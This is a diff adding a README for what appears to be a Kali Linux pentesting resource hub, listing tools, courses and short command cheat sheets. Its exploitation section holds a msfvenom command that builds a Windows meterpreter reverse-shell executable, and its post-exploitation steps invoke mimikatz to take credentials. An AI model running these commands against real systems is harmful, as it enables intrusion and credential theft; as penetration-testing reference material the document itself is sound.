@@ -1,0 +1,143 @@
+# Best Kali Tools & Resources Hub
+
+## 📚 Official Resources
+
+- [Kali Tools Documentation](https://www.kali.org/tools/)
+- [Kali Wiki](https://wiki.kali.org/)
+- [Offensive Security](https://www.offensive-security.com/)
+
+## 🛠️ Best Tool Collections
+
+| Category | Tools |
+|----------|-------|
+| **Network** | nmap, masscan, netdiscover, arp-scan |
+| **WiFi** | aircrack-ng, wifite, reaver, mdk4, fluxion |
+| **Web** | nikto, dirb, gobuster, sqlmap, zaproxy, burpsuite |
+| **Password** | hashcat, john, hydra, medusa |
+| **Exploit** | msfconsole, searchsploit, msfvenom |
+| **Windows** | responder, crackmapexec, impacket |
+| **OSINT** | theharvester, recon-ng, maltego |
+| **Forensics** | autopsy, binwalk, foremost, volatility |
+
+## 🌐 Best Learning Resources
+
+### YouTube
+- LiveOverflow
+- IppSec
+- Nahamsec
+- SecurityTube
+- David Bombal
+
+### Practice Labs
+- HackTheBox
+- TryHackMe
+- PentesterLab
+- OverTheWire
+- Root Me
+
+### Books
+- The Hacker Playbook 1-3
+- Penetration Testing: A Hands-On Introduction
+- Black Hat Python
+- Gray Hat Hacking
+
+## 📁 Custom Scripts Location
+
+```
+/scripts/           - Custom automation scripts
+/skills/           - Pentest skill guides
+/chains/           - Workflow chains
+/agents/           - AI agent configs
+/docs/             - Documentation
+```
+
+## 🔗 Essential Tools
+
+### Recon
+```bash
+nmap -sn 192.168.1.0/24          # Discovery
+subfinder -d target             # Subdomains
+amass enum -d target             # Deep enum
+httpx -domains targets.txt      # Probe
+```
+
+### Scanning
+```bash
+nmap -sV -sC -p- target          # Full scan
+masscan -p1-65535 target        # Fast
+nikto -h target                 # Web scan
+```
+
+### Exploitation
+```bash
+msfconsole                      # Metasploit
+searchsploit vuln               # Find exploits
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
+```
+
+### Post-Exploitation
+```bash
+enum Linux                      # Linux enum
+winPEAS.exe                     # Windows enum
+mimikatz                        # Credentials
+```
+
+## 🤖 AI Integration
+
+### OpenCode
+```bash
+opencode                        # AI coding
+opencode mcp list              # Check MCPs
+```
+
+### Gemini CLI
+```bash
+gemini                         # Interactive
+gemini -p "explain this vulnerability"
+```
+
+### TARS
+```bash
+tars                           # Agent framework
+```
+
+## 📦 Plugin Repositories
+
+### GitHub Collections
+- awesomemf - Awesome malware
+- alex cesario - Pentest tools
+- nullbyte - Hacking tools
+- 1N3 - Sn1per
+- entynetproject - Hacking tools
+
+## 🔧 Custom Tool Setup
+
+### Quick Install
+```bash
+./scripts/install-all-tools.sh   # Install everything
+./scripts/install-essential-tools.sh
+```
+
+## 📝 Notes
+
+- Update tools: `apt update && apt upgrade`
+- Add custom tools to: `/opt/`
+- Keep wordlists in: `/usr/share/wordlists/`
+- Custom scripts: `~/.local/bin/`
+
+## 🎯 Workflow Example
+
+```bash
+# 1. Recon
+subfinder -d target.com -o subs.txt
+
+# 2. Scan  
+nmap -iL subs.txt -sV -o scan.txt
+
+# 3. Exploit
+msfconsole -q -x "use exploit/windows/smb/..."
+
+# 4. Post
+enum Linux
+mimikatz
+```
